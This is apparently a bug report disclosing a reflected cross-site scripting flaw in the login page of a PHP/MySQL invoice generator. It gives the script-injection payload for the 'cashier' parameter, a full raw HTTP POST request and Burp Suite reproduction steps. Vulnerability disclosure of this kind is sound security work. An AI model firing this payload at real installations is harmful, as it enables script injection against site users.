# Simple Invoice Generator System using PHP and MySQL by oretnom23 has Cross-site Scripting

#### BUG_Author: xxxw

vendors:https://www.sourcecodester.com/php/16991/simple-invoice-generator-system-using-php-and-mysql.html

Payload: cashier=1'"()%26%25<zzz><ScRiPt%20>DDRe(9741)</ScRiPt>

#### Request :

```html
POST /php-invoice/login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.3.11/php-invoice/
Cookie: PHPSESSID=rcgpic00c0dnqpe4d102ifi378
Content-Length: 54
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Host: 192.168.3.11
Connection: Keep-alive

cashier=1'"()%26%25<zzz><ScRiPt%20>DDRe(9741)</ScRiPt>
```



#### Response：

![](https://gitee.com/xw1150/images/raw/master/img/202312061330085.png)

#### use burpsuit

1. login site click login select Cashier1

![image-20231206132634688](https://gitee.com/xw1150/images/raw/master/img/202312061326738.png)

2.  set cashier = 1'"()%26%25<zzz><ScRiPt%20>DDRe(9741)</ScRiPt>

![image-20231206132953684](https://gitee.com/xw1150/images/raw/master/img/202312061329722.png)

3.  response

![image-20231206133058028](https://gitee.com/xw1150/images/raw/master/img/202312061330085.png)